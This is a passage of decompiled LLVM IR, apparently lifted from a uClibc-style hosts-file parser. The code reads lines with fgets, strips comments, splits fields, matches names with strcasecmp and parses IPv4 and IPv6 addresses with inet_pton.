  %v0_1000a7e8 = load i32, i32* @r26, align 4
  store i32 %v0_1000a7e8, i32* @r23, align 4
  %v0_1000a7ec = load i32, i32* @r31, align 4
  store i32 %v0_1000a7ec, i32* @r24, align 4
  store i32 %v0_1000a7e0, i32* %r21.global-to-local, align 4
  %v1_1000a888.pre = load i32, i32* %r16.global-to-local, align 4
  br label %dec_label_pc_1000a880

dec_label_pc_1000a7f8:                            ; preds = %dec_label_pc_1000a7d4
  %v1_1000a7f8 = load i32, i32* %r17.global-to-local, align 4
  %v2_1000a7f8 = inttoptr i32 %v1_1000a7f8 to i32*
  store i32 0, i32* %v2_1000a7f8, align 4
  %v0_1000a7fc = call i32 @__errno_location()
  %v1_1000a800 = inttoptr i32 %v0_1000a7fc to i32*
  %v2_1000a800 = load i32, i32* %v1_1000a800, align 4
  store i32 %v2_1000a800, i32* @r26, align 4
  br label %dec_label_pc_1000aa18

dec_label_pc_1000a808:                            ; preds = %dec_label_pc_1000a9a8
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1000a80c = load i32, i32* @r25, align 4
  %v1_1000a80c = load i32, i32* @r22, align 4
  %v2_1000a80c = inttoptr i32 %v1_1000a80c to i32*
  store i32 %v0_1000a80c, i32* %v2_1000a80c, align 4
  %v0_1000a810 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000a810 = load i32, i32* @r22, align 4
  %v2_1000a810 = add i32 %v1_1000a810, 4
  %v3_1000a810 = inttoptr i32 %v2_1000a810 to i32*
  store i32 %v0_1000a810, i32* %v3_1000a810, align 4
  %v0_1000a814 = load i32, i32* @r30, align 4
  %v1_1000a814 = add i32 %v0_1000a814, 8
  store i32 %v1_1000a814, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  %v1_1000a81c = add i32 %v0_1000a814, 4
  %v2_1000a81c = inttoptr i32 %v1_1000a81c to i32*
  %v3_1000a81c = load i32, i32* %v2_1000a81c, align 4
  store i32 %v3_1000a81c, i32* %r0.global-to-local, align 4
  %v0_1000a820 = load i32, i32* %r19.global-to-local, align 4
  %v1_1000a820 = load i32, i32* @r28, align 4
  %v2_1000a820 = add i32 %v1_1000a820, 8
  %v3_1000a820 = inttoptr i32 %v2_1000a820 to i32*
  store i32 %v0_1000a820, i32* %v3_1000a820, align 4
  %v0_1000a824 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000a824 = load i32, i32* @r28, align 4
  %v2_1000a824 = inttoptr i32 %v1_1000a824 to i32*
  store i32 %v0_1000a824, i32* %v2_1000a824, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_1000a82c = load i32, i32* @r28, align 4
  %v2_1000a82c = add i32 %v1_1000a82c, 12
  %v3_1000a82c = inttoptr i32 %v2_1000a82c to i32*
  store i32 4, i32* %v3_1000a82c, align 4
  %v0_1000a830 = load i32, i32* @r22, align 4
  %v1_1000a830 = load i32, i32* @r28, align 4
  %v2_1000a830 = add i32 %v1_1000a830, 16
  %v3_1000a830 = inttoptr i32 %v2_1000a830 to i32*
  store i32 %v0_1000a830, i32* %v3_1000a830, align 4
  br label %dec_label_pc_1000a864

dec_label_pc_1000a838:                            ; preds = %dec_label_pc_1000a9cc
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1000a83c = load i32, i32* %r21.global-to-local, align 4
  %v1_1000a83c = load i32, i32* @r23, align 4
  %v2_1000a83c = inttoptr i32 %v1_1000a83c to i32*
  store i32 %v0_1000a83c, i32* %v2_1000a83c, align 4
  %v0_1000a840 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000a840 = load i32, i32* @r23, align 4
  %v2_1000a840 = add i32 %v1_1000a840, 4
  %v3_1000a840 = inttoptr i32 %v2_1000a840 to i32*
  store i32 %v0_1000a840, i32* %v3_1000a840, align 4
  %v0_1000a844 = load i32, i32* @r30, align 4
  %v1_1000a844 = add i32 %v0_1000a844, 8
  store i32 %v1_1000a844, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  %v1_1000a84c = add i32 %v0_1000a844, 4
  %v2_1000a84c = inttoptr i32 %v1_1000a84c to i32*
  %v3_1000a84c = load i32, i32* %v2_1000a84c, align 4
  store i32 %v3_1000a84c, i32* %r0.global-to-local, align 4
  %v0_1000a850 = load i32, i32* %r19.global-to-local, align 4
  %v1_1000a850 = load i32, i32* @r28, align 4
  %v2_1000a850 = add i32 %v1_1000a850, 8
  %v3_1000a850 = inttoptr i32 %v2_1000a850 to i32*
  store i32 %v0_1000a850, i32* %v3_1000a850, align 4
  %v0_1000a854 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000a854 = load i32, i32* @r28, align 4
  %v2_1000a854 = inttoptr i32 %v1_1000a854 to i32*
  store i32 %v0_1000a854, i32* %v2_1000a854, align 4
  store i32 16, i32* %r0.global-to-local, align 4
  %v1_1000a85c = load i32, i32* @r28, align 4
  %v2_1000a85c = add i32 %v1_1000a85c, 12
  %v3_1000a85c = inttoptr i32 %v2_1000a85c to i32*
  store i32 16, i32* %v3_1000a85c, align 4
  %v0_1000a860 = load i32, i32* @r23, align 4
  %v1_1000a860 = load i32, i32* @r28, align 4
  %v2_1000a860 = add i32 %v1_1000a860, 16
  %v3_1000a860 = inttoptr i32 %v2_1000a860 to i32*
  store i32 %v0_1000a860, i32* %v3_1000a860, align 4
  br label %dec_label_pc_1000a864

dec_label_pc_1000a864:                            ; preds = %dec_label_pc_1000a808, %dec_label_pc_1000a838
  %v0_1000a864 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a864 = load i32, i32* @r28, align 4
  %v2_1000a864 = add i32 %v1_1000a864, 4
  %v3_1000a864 = inttoptr i32 %v2_1000a864 to i32*
  store i32 %v0_1000a864, i32* %v3_1000a864, align 4
  %v0_1000a868 = load i32, i32* @r28, align 4
  %v1_1000a868 = load i32, i32* %r17.global-to-local, align 4
  %v2_1000a868 = inttoptr i32 %v1_1000a868 to i32*
  store i32 %v0_1000a868, i32* %v2_1000a868, align 4
  br label %dec_label_pc_1000aa00

dec_label_pc_1000a870:                            ; preds = %dec_label_pc_1000a768
  store i32 0, i32* @r25, align 4
  store i32 0, i32* %r21.global-to-local, align 4
  store i32 0, i32* @r23, align 4
  br label %dec_label_pc_1000a880

dec_label_pc_1000a880:                            ; preds = %dec_label_pc_1000a7e0, %dec_label_pc_1000a870
  %v1_1000a888 = phi i32 [ %v1_1000a888.pre, %dec_label_pc_1000a7e0 ], [ %arg8, %dec_label_pc_1000a870 ]
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r26, align 4
  %v2_1000a888 = inttoptr i32 %v1_1000a888 to i32*
  store i32 1, i32* %v2_1000a888, align 4
  br label %dec_label_pc_1000a9e8

dec_label_pc_1000a890:                            ; preds = %dec_label_pc_1000a9e8
  %v0_1000a890 = load i32, i32* @r24, align 4
  store i32 %v0_1000a890, i32* @r3, align 4
  store i32 268478620, i32* @lr, align 4
  %v2_1000a898 = call i32 @__GI_strchr(i32 %v0_1000a890, i32 35)
  %v4_1000a89c = icmp eq i32 %v2_1000a898, 0
  br i1 %v4_1000a89c, label %dec_label_pc_1000a8ac, label %dec_label_pc_1000a8a4

dec_label_pc_1000a8a4:                            ; preds = %dec_label_pc_1000a890
  %v3_1000a898 = inttoptr i32 %v2_1000a898 to i8*
  store i32 0, i32* %r0.global-to-local, align 4
  store i8 0, i8* %v3_1000a898, align 1
  br label %dec_label_pc_1000a8ac

dec_label_pc_1000a8ac:                            ; preds = %dec_label_pc_1000a890, %dec_label_pc_1000a8a4
  %v0_1000a8ac = load i32, i32* @r24, align 4
  store i32 %v0_1000a8ac, i32* %r11.global-to-local, align 4
  store i32 0, i32* @r29, align 4
  %v1_1000a92817 = inttoptr i32 %v0_1000a8ac to i8*
  %v2_1000a92818 = load i8, i8* %v1_1000a92817, align 1
  %v3_1000a92819 = zext i8 %v2_1000a92818 to i32
  store i32 %v3_1000a92819, i32* %r0.global-to-local, align 4
  %v3_1000a92c21 = icmp eq i8 %v2_1000a92818, 0
  br i1 %v3_1000a92c21, label %dec_label_pc_1000a934, label %dec_label_pc_1000a8c4.preheader

dec_label_pc_1000a8b8:                            ; preds = %dec_label_pc_1000a8d4
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_1000a8bc = inttoptr i32 %v0_1000a8f8 to i8*
  store i8 0, i8* %v3_1000a8bc, align 1
  %v0_1000a8c0 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000a8c0 = add i32 %v0_1000a8c0, 1
  store i32 %v1_1000a8c0, i32* %r11.global-to-local, align 4
  %v1_1000a8c4 = inttoptr i32 %v1_1000a8c0 to i8*
  %v2_1000a8c4 = load i8, i8* %v1_1000a8c4, align 1
  %v3_1000a8c4 = zext i8 %v2_1000a8c4 to i32
  store i32 %v3_1000a8c4, i32* %r0.global-to-local, align 4
  %v3_1000a8c8 = icmp eq i8 %v2_1000a8c4, 0
  br i1 %v3_1000a8c8, label %dec_label_pc_1000a934, label %dec_label_pc_1000a8d4

dec_label_pc_1000a8d4:                            ; preds = %dec_label_pc_1000a8c4.preheader, %dec_label_pc_1000a8b8
  %v0_1000a8f8 = phi i32 [ %v1_1000a8c0, %dec_label_pc_1000a8b8 ], [ %v0_1000a8c42, %dec_label_pc_1000a8c4.preheader ]
  %v0_1000a8dc.in = phi i32 [ %v3_1000a8c4, %dec_label_pc_1000a8b8 ], [ %v3_1000a8c45, %dec_label_pc_1000a8c4.preheader ]
  %v0_1000a8dc = mul nuw nsw i32 %v0_1000a8dc.in, 2
  %v3_1000a8d8 = load i32, i32* @global_var_1001d808, align 4
  store i32 %v3_1000a8d8, i32* %r9.global-to-local, align 4
  %v2_1000a8dc = add i32 %v3_1000a8d8, %v0_1000a8dc
  %v3_1000a8dc = inttoptr i32 %v2_1000a8dc to i16*
  %v4_1000a8dc = load i16, i16* %v3_1000a8dc, align 2
  %v5_1000a8dc = zext i16 %v4_1000a8dc to i32
  store i32 %v5_1000a8dc, i32* %r0.global-to-local, align 4
  %v1_1000a8e0 = and i32 %v5_1000a8dc, 32
  store i32 %v1_1000a8e0, i32* %r9.global-to-local, align 4
  %v3_1000a8e0 = icmp eq i32 %v1_1000a8e0, 0
  br i1 %v3_1000a8e0, label %dec_label_pc_1000a8e8, label %dec_label_pc_1000a8b8

dec_label_pc_1000a8e8:                            ; preds = %dec_label_pc_1000a8d4
  %v0_1000a8e8 = load i32, i32* @r29, align 4
  %v2_1000a8e8 = icmp sgt i32 %v0_1000a8e8, 6
  br i1 %v2_1000a8e8, label %dec_label_pc_1000a904.preheader, label %dec_label_pc_1000a8f0

dec_label_pc_1000a8f0:                            ; preds = %dec_label_pc_1000a8e8
  %v1_1000a8f0 = mul i32 %v0_1000a8e8, 4
  store i32 %v1_1000a8f0, i32* %r0.global-to-local, align 4
  %v1_1000a8f4 = add i32 %v0_1000a8e8, 1
  store i32 %v1_1000a8f4, i32* @r29, align 4
  %v1_1000a8f8 = load i32, i32* @r30, align 4
  %v3_1000a8f8 = add i32 %v1_1000a8f8, %v1_1000a8f0
  %v4_1000a8f8 = inttoptr i32 %v3_1000a8f8 to i32*
  store i32 %v0_1000a8f8, i32* %v4_1000a8f8, align 4
  %v0_1000a9049.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000a904.preheader

dec_label_pc_1000a904.preheader:                  ; preds = %dec_label_pc_1000a8f0, %dec_label_pc_1000a8e8
  %v0_1000a9049 = phi i32 [ %v0_1000a9049.pre, %dec_label_pc_1000a8f0 ], [ %v0_1000a8f8, %dec_label_pc_1000a8e8 ]
  %v1_1000a90410 = inttoptr i32 %v0_1000a9049 to i8*
  %v2_1000a90411 = load i8, i8* %v1_1000a90410, align 1
  %v3_1000a90412 = zext i8 %v2_1000a90411 to i32
  store i32 %v3_1000a90412, i32* %r0.global-to-local, align 4
  %v3_1000a90814 = icmp eq i8 %v2_1000a90411, 0
  br i1 %v3_1000a90814, label %dec_label_pc_1000a928.loopexit, label %dec_label_pc_1000a914.lr.ph

dec_label_pc_1000a914.lr.ph:                      ; preds = %dec_label_pc_1000a904.preheader
  %v3_1000a918.pre = load i32, i32* @global_var_1001d808, align 4
  br label %dec_label_pc_1000a914

dec_label_pc_1000a900:                            ; preds = %dec_label_pc_1000a914
  %v1_1000a900 = add i32 %v0_1000a900, 1
  store i32 %v1_1000a900, i32* %r11.global-to-local, align 4
  %v1_1000a904 = inttoptr i32 %v1_1000a900 to i8*
  %v2_1000a904 = load i8, i8* %v1_1000a904, align 1
  %v3_1000a904 = zext i8 %v2_1000a904 to i32
  store i32 %v3_1000a904, i32* %r0.global-to-local, align 4
  %v3_1000a908 = icmp eq i8 %v2_1000a904, 0
  br i1 %v3_1000a908, label %dec_label_pc_1000a928.loopexit, label %dec_label_pc_1000a914

dec_label_pc_1000a914:                            ; preds = %dec_label_pc_1000a914.lr.ph, %dec_label_pc_1000a900
  %v0_1000a900 = phi i32 [ %v0_1000a9049, %dec_label_pc_1000a914.lr.ph ], [ %v1_1000a900, %dec_label_pc_1000a900 ]
  %v0_1000a91c.in = phi i32 [ %v3_1000a90412, %dec_label_pc_1000a914.lr.ph ], [ %v3_1000a904, %dec_label_pc_1000a900 ]
  %v0_1000a91c = mul nuw nsw i32 %v0_1000a91c.in, 2
  store i32 %v3_1000a918.pre, i32* %r9.global-to-local, align 4
  %v2_1000a91c = add i32 %v0_1000a91c, %v3_1000a918.pre
  %v3_1000a91c = inttoptr i32 %v2_1000a91c to i16*
  %v4_1000a91c = load i16, i16* %v3_1000a91c, align 2
  %v5_1000a91c = zext i16 %v4_1000a91c to i32
  store i32 %v5_1000a91c, i32* %r0.global-to-local, align 4
  %v1_1000a920 = and i32 %v5_1000a91c, 32
  store i32 %v1_1000a920, i32* %r9.global-to-local, align 4
  %v3_1000a920 = icmp eq i32 %v1_1000a920, 0
  br i1 %v3_1000a920, label %dec_label_pc_1000a900, label %dec_label_pc_1000a928.loopexit

dec_label_pc_1000a928.loopexit:                   ; preds = %dec_label_pc_1000a914, %dec_label_pc_1000a900, %dec_label_pc_1000a904.preheader
  %v0_1000a928 = phi i32 [ %v0_1000a9049, %dec_label_pc_1000a904.preheader ], [ %v0_1000a900, %dec_label_pc_1000a914 ], [ %v1_1000a900, %dec_label_pc_1000a900 ]
  %v1_1000a928 = inttoptr i32 %v0_1000a928 to i8*
  %v2_1000a928 = load i8, i8* %v1_1000a928, align 1
  %v3_1000a928 = zext i8 %v2_1000a928 to i32
  store i32 %v3_1000a928, i32* %r0.global-to-local, align 4
  %v3_1000a92c = icmp eq i8 %v2_1000a928, 0
  br i1 %v3_1000a92c, label %dec_label_pc_1000a934, label %dec_label_pc_1000a8c4.preheader

dec_label_pc_1000a8c4.preheader:                  ; preds = %dec_label_pc_1000a8ac, %dec_label_pc_1000a928.loopexit
  %v0_1000a8c42 = phi i32 [ %v0_1000a928, %dec_label_pc_1000a928.loopexit ], [ %v0_1000a8ac, %dec_label_pc_1000a8ac ]
  %v1_1000a8c43 = inttoptr i32 %v0_1000a8c42 to i8*
  %v2_1000a8c44 = load i8, i8* %v1_1000a8c43, align 1
  %v3_1000a8c45 = zext i8 %v2_1000a8c44 to i32
  store i32 %v3_1000a8c45, i32* %r0.global-to-local, align 4
  %v3_1000a8c87 = icmp eq i8 %v2_1000a8c44, 0
  br i1 %v3_1000a8c87, label %dec_label_pc_1000a934, label %dec_label_pc_1000a8d4

dec_label_pc_1000a934:                            ; preds = %dec_label_pc_1000a928.loopexit, %dec_label_pc_1000a8c4.preheader, %dec_label_pc_1000a8b8, %dec_label_pc_1000a8ac
  %v0_1000a934 = load i32, i32* @r29, align 4
  %v1_1000a938 = mul i32 %v0_1000a934, 4
  store i32 %v1_1000a938, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1000a940 = load i32, i32* @r30, align 4
  %v3_1000a940 = add i32 %v2_1000a940, %v1_1000a938
  %v4_1000a940 = inttoptr i32 %v3_1000a940 to i32*
  store i32 0, i32* %v4_1000a940, align 4
  %tmp55 = icmp slt i32 %v0_1000a934, 2
  br i1 %tmp55, label %dec_label_pc_1000a9e8, label %dec_label_pc_1000a948

dec_label_pc_1000a948:                            ; preds = %dec_label_pc_1000a934
  %v0_1000a948 = load i32, i32* %r18.global-to-local, align 4
  %v3_1000a948 = icmp eq i32 %v0_1000a948, 1
  br i1 %v3_1000a948, label %dec_label_pc_1000aa00, label %dec_label_pc_1000a950

dec_label_pc_1000a950:                            ; preds = %dec_label_pc_1000a948
  %v3_1000a950 = icmp eq i32 %v0_1000a948, 2
  store i32 1, i32* @r31, align 4
  br i1 %v3_1000a950, label %dec_label_pc_1000a95c, label %dec_label_pc_1000a988.preheader

dec_label_pc_1000a988.preheader:                  ; preds = %dec_label_pc_1000a950
  %v1_1000a98823 = load i32, i32* @r29, align 4
  %v2_1000a98824 = icmp sgt i32 %v1_1000a98823, 1
  store i32 4, i32* %r0.global-to-local, align 4
  %v0_1000a99029 = load i32, i32* %r15.global-to-local, align 4
  store i32 %v0_1000a99029, i32* @r3, align 4
  br i1 %v2_1000a98824, label %dec_label_pc_1000a974, label %dec_label_pc_1000a998

dec_label_pc_1000a95c:                            ; preds = %dec_label_pc_1000a950
  %v0_1000a95c = load i32, i32* @r30, align 4
  %v1_1000a95c = inttoptr i32 %v0_1000a95c to i32*
  %v2_1000a95c = load i32, i32* %v1_1000a95c, align 4
  store i32 %v2_1000a95c, i32* @r4, align 4
  %v0_1000a960 = load i32, i32* %r15.global-to-local, align 4
  %v2_1000a964 = inttoptr i32 %v0_1000a960 to i8*
  %v3_1000a964 = call i32 @__GI_strcoll(i8* %v2_1000a964, i32 %v2_1000a95c)
  %v3_1000a968 = icmp eq i32 %v3_1000a964, 0
  br i1 %v3_1000a968, label %dec_label_pc_1000a9a0, label %dec_label_pc_1000a9e8

dec_label_pc_1000a974:                            ; preds = %dec_label_pc_1000a988.preheader, %dec_label_pc_1000a984
  %v1_1000a974 = phi i32 [ %v1_1000a98c, %dec_label_pc_1000a984 ], [ 4, %dec_label_pc_1000a988.preheader ]
  %v0_1000a99031 = phi i32 [ %v0_1000a990, %dec_label_pc_1000a984 ], [ %v0_1000a99029, %dec_label_pc_1000a988.preheader ]
  %v0_1000a974 = load i32, i32* @r30, align 4
  %v2_1000a974 = add i32 %v0_1000a974, %v1_1000a974
  %v3_1000a974 = inttoptr i32 %v2_1000a974 to i32*
  %v4_1000a974 = load i32, i32* %v3_1000a974, align 4
  store i32 %v4_1000a974, i32* @r4, align 4
  %v2_1000a978 = call i32 @__GI_strcasecmp(i32 %v0_1000a99031, i32 %v4_1000a974)
  %v3_1000a97c = icmp eq i32 %v2_1000a978, 0
  %v0_1000a998.pre = load i32, i32* @r31, align 4
  br i1 %v3_1000a97c, label %dec_label_pc_1000a974.dec_label_pc_1000a998_crit_edge, label %dec_label_pc_1000a984

dec_label_pc_1000a984:                            ; preds = %dec_label_pc_1000a974
  %v1_1000a984 = add i32 %v0_1000a998.pre, 1
  store i32 %v1_1000a984, i32* @r31, align 4
  %v1_1000a988 = load i32, i32* @r29, align 4
  %v2_1000a988 = icmp slt i32 %v1_1000a984, %v1_1000a988
  %v1_1000a98c = mul i32 %v1_1000a984, 4
  store i32 %v1_1000a98c, i32* %r0.global-to-local, align 4
  %v0_1000a990 = load i32, i32* %r15.global-to-local, align 4
  store i32 %v0_1000a990, i32* @r3, align 4
  br i1 %v2_1000a988, label %dec_label_pc_1000a974, label %dec_label_pc_1000a998

dec_label_pc_1000a974.dec_label_pc_1000a998_crit_edge: ; preds = %dec_label_pc_1000a974
  %v1_1000a998.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000a998

dec_label_pc_1000a998:                            ; preds = %dec_label_pc_1000a984, %dec_label_pc_1000a974.dec_label_pc_1000a998_crit_edge, %dec_label_pc_1000a988.preheader
  %v1_1000a998 = phi i32 [ %v1_1000a998.pre, %dec_label_pc_1000a974.dec_label_pc_1000a998_crit_edge ], [ %v1_1000a98823, %dec_label_pc_1000a988.preheader ], [ %v1_1000a988, %dec_label_pc_1000a984 ]
  %v0_1000a998 = phi i32 [ %v0_1000a998.pre, %dec_label_pc_1000a974.dec_label_pc_1000a998_crit_edge ], [ 1, %dec_label_pc_1000a988.preheader ], [ %v1_1000a984, %dec_label_pc_1000a984 ]
  %v2_1000a998 = icmp slt i32 %v0_1000a998, %v1_1000a998
  br i1 %v2_1000a998, label %dec_label_pc_1000a9a0, label %dec_label_pc_1000a9e8

dec_label_pc_1000a9a0:                            ; preds = %dec_label_pc_1000a95c, %dec_label_pc_1000a998
  %v0_1000a9a0 = load i32, i32* %r19.global-to-local, align 4
  %v3_1000a9a0 = icmp eq i32 %v0_1000a9a0, 2
  br i1 %v3_1000a9a0, label %dec_label_pc_1000a9a8, label %dec_label_pc_1000a9c4

dec_label_pc_1000a9a8:                            ; preds = %dec_label_pc_1000a9a0
  %v0_1000a9a8 = load i32, i32* @r30, align 4
  %v1_1000a9a8 = inttoptr i32 %v0_1000a9a8 to i32*
  %v2_1000a9a8 = load i32, i32* %v1_1000a9a8, align 4
  %v0_1000a9b0 = load i32, i32* @r25, align 4
  store i32 268478904, i32* @lr, align 4
  %v3_1000a9b4 = inttoptr i32 %v2_1000a9a8 to i8*
  %v4_1000a9b4 = call i32 @inet_pton(i32 2, i8* %v3_1000a9b4, i32 %v0_1000a9b0)
  %v2_1000a9b8 = icmp sgt i32 %v4_1000a9b4, 0
  br i1 %v2_1000a9b8, label %dec_label_pc_1000a808, label %dec_label_pc_1000a9e4

dec_label_pc_1000a9c4:                            ; preds = %dec_label_pc_1000a9a0
  %v3_1000a9c4 = icmp eq i32 %v0_1000a9a0, 10
  br i1 %v3_1000a9c4, label %dec_label_pc_1000a9cc, label %dec_label_pc_1000a9e4

dec_label_pc_1000a9cc:                            ; preds = %dec_label_pc_1000a9c4
  %v0_1000a9cc = load i32, i32* @r30, align 4
  %v1_1000a9cc = inttoptr i32 %v0_1000a9cc to i32*
  %v2_1000a9cc = load i32, i32* %v1_1000a9cc, align 4
  %v0_1000a9d4 = load i32, i32* %r21.global-to-local, align 4
  store i32 268478940, i32* @lr, align 4
  %v3_1000a9d8 = inttoptr i32 %v2_1000a9cc to i8*
  %v4_1000a9d8 = call i32 @inet_pton(i32 10, i8* %v3_1000a9d8, i32 %v0_1000a9d4)
  %v2_1000a9dc = icmp sgt i32 %v4_1000a9d8, 0
  br i1 %v2_1000a9dc, label %dec_label_pc_1000a838, label %dec_label_pc_1000a9e4

dec_label_pc_1000a9e4:                            ; preds = %dec_label_pc_1000a9a8, %dec_label_pc_1000a9c4, %dec_label_pc_1000a9cc
  store i32 2, i32* @r26, align 4
  br label %dec_label_pc_1000a9e8

dec_label_pc_1000a9e8:                            ; preds = %dec_label_pc_1000a998, %dec_label_pc_1000a95c, %dec_label_pc_1000a934, %dec_label_pc_1000a9e4, %dec_label_pc_1000a880
  %v0_1000a9e8 = load i32, i32* @r24, align 4
  %v0_1000a9ec = load i32, i32* @r27, align 4
  %v0_1000a9f0 = load i32, i32* @r20, align 4
  store i32 268478968, i32* @lr, align 4
  %v3_1000a9f4 = call i32 @fgets(i32 %v0_1000a9e8, i32 %v0_1000a9ec, i32 %v0_1000a9f0)
  %v3_1000a9f8 = icmp eq i32 %v3_1000a9f4, 0
  br i1 %v3_1000a9f8, label %dec_label_pc_1000aa00, label %dec_label_pc_1000a890

dec_label_pc_1000aa00:                            ; preds = %dec_label_pc_1000a9e8, %dec_label_pc_1000a948, %dec_label_pc_1000a864
  %v0_1000aa00 = load i32, i32* %r18.global-to-local, align 4
  %v3_1000aa00 = icmp eq i32 %v0_1000aa00, 1
  br i1 %v3_1000aa00, label %dec_label_pc_1000aa18, label %dec_label_pc_1000aa08

dec_label_pc_1000aa08:                            ; preds = %dec_label_pc_1000aa00
  %v0_1000aa08 = load i32, i32* @r20, align 4
  store i32 ptrtoint (i32* @global_var_1000aa10.482 to i32), i32* @lr, align 4
  %v1_1000aa0c = inttoptr i32 %v0_1000aa08 to i16*
  %v2_1000aa0c = call i32 @__GI_fclose(i16* %v1_1000aa0c)
  br label %dec_label_pc_1000aa18

dec_label_pc_1000aa14:                            ; preds = %dec_label_pc_1000a7cc, %dec_label_pc_1000a79c, %dec_label_pc_1000a794, %dec_label_pc_1000a788, %dec_label_pc_1000a778, %dec_label_pc_1000a760, %dec_label_pc_1000a750
  store i32 34, i32* @r26, align 4
  br label %dec_label_pc_1000aa18

dec_label_pc_1000aa18:                            ; preds = %dec_label_pc_1000aa00, %dec_label_pc_1000aa08, %dec_label_pc_1000a7f8, %dec_label_pc_1000aa14
  store i32 %v0_1000a714, i32* %r0.global-to-local, align 4
  %v0_1000aa1c = load i32, i32* @r26, align 4
  ret i32 %v0_1000aa1c

; uselistorder directives
  uselistorder i32 %v0_1000a990, { 1, 0 }
  uselistorder i32 %v1_1000a984, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1000a938, { 1, 0 }
  uselistorder i32 %v0_1000a934, { 1, 0 }
  uselistorder i32 %v3_1000a8c45, { 1, 0 }
  uselistorder i32 %v0_1000a8c42, { 1, 0 }
  uselistorder i32 %v1_1000a8f0, { 1, 0 }
  uselistorder i32 %v0_1000a8e8, { 1, 0, 2 }
  uselistorder i32 %v2_1000a898, { 1, 0 }
  uselistorder i32 %v0_1000a788, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1000a760.pr, { 1, 0, 2 }
  uselistorder i32 %v1_1000a72c, { 4, 3, 2, 1, 0 }
  uselistorder i32* %r9.global-to-local, { 5, 6, 7, 8, 9, 3, 2, 4, 10, 11, 0, 1 }
  uselistorder i32* %r21.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r19.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r15.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r11.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 1, 12, 30, 13, 0, 20, 14, 15, 28, 16, 17, 19, 18, 29, 21, 22, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 23, 24, 25, 26, 27 }
  uselistorder i32 34, { 3, 4, 8, 0, 1, 2, 5, 6, 7 }
  uselistorder i32 (i16*)* @__GI_fclose, { 5, 6, 0, 1, 2, 3, 4 }
  uselistorder i32 (i32, i32, i32)* @fgets, { 1, 0, 4, 3, 2 }
  uselistorder i32 10, { 8, 21, 22, 23, 24, 25, 26, 27, 16, 17, 13, 14, 15, 29, 28, 30, 31, 4, 32, 2, 33, 3, 34, 1, 5, 9, 37, 10, 19, 11, 20, 18, 6, 35, 36, 12, 0, 7 }
  uselistorder i32 (i32, i32)* @__GI_strcasecmp, { 1, 7, 6, 5, 4, 3, 2, 0 }
  uselistorder i32 (i8*, i32)* @__GI_strcoll, { 1, 2, 3, 4, 0 }
  uselistorder i32 6, { 16, 17, 18, 19, 20, 0, 1, 2, 12, 13, 14, 15, 6, 7, 8, 3, 21, 22, 4, 23, 9, 24, 5, 10, 11 }
  uselistorder i32* @global_var_1001d808, { 0, 3, 1, 4, 5, 2, 6 }
  uselistorder i32 12, { 25, 26, 27, 0, 28, 29, 30, 11, 14, 31, 32, 8, 9, 10, 12, 33, 46, 47, 48, 49, 50, 51, 52, 53, 5, 6, 54, 55, 56, 59, 15, 17, 24, 16, 37, 38, 39, 40, 4, 18, 36, 1, 2, 7, 19, 3, 13, 41, 42, 43, 44, 60, 57, 58, 34, 35, 20, 21, 22, 23, 45 }
  uselistorder i32 80, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 48, { 12, 7, 8, 9, 1, 10, 11, 4, 14, 15, 2, 16, 17, 18, 6, 19, 5, 20, 3, 0, 21, 22, 13 }
  uselistorder i32 -48, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 16, { 19, 5, 20, 21, 6, 22, 23, 0, 24, 25, 1, 26, 7, 27, 28, 44, 45, 29, 39, 40, 30, 31, 32, 33, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 66, 59, 3, 17, 12, 14, 13, 41, 42, 70, 71, 72, 34, 35, 60, 61, 62, 63, 64, 65, 67, 68, 69, 36, 2, 37, 38, 8, 15, 16, 4, 9, 18, 10, 11, 43 }
  uselistorder i32* @r27, { 15, 16, 17, 18, 19, 20, 1, 21, 22, 23, 24, 12, 13, 6, 14, 3, 2, 25, 26, 27, 28, 33, 0, 34, 35, 36, 37, 45, 46, 47, 48, 49, 50, 57, 58, 80, 4, 81, 7, 82, 87, 51, 52, 53, 54, 55, 56, 83, 84, 85, 59, 60, 38, 39, 40, 61, 62, 5, 63, 64, 65, 66, 8, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 9, 10, 11, 86, 41, 42, 43, 44, 78, 79, 29, 30, 31, 32 }
  uselistorder i32 32, { 28, 29, 30, 19, 31, 32, 20, 16, 17, 25, 1, 2, 3, 13, 37, 38, 39, 21, 18, 40, 41, 14, 15, 26, 27, 12, 35, 33, 34, 42, 43, 22, 44, 45, 46, 47, 48, 49, 50, 0, 51, 52, 36, 5, 6, 4, 8, 7, 23, 24, 10, 11, 9 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_1000aa18, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_1000a9e8, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_1000a9e4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000a9a0, { 1, 0 }
  uselistorder label %dec_label_pc_1000a998, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000a974, { 1, 0 }
  uselistorder label %dec_label_pc_1000a934, { 1, 0, 2, 3 }
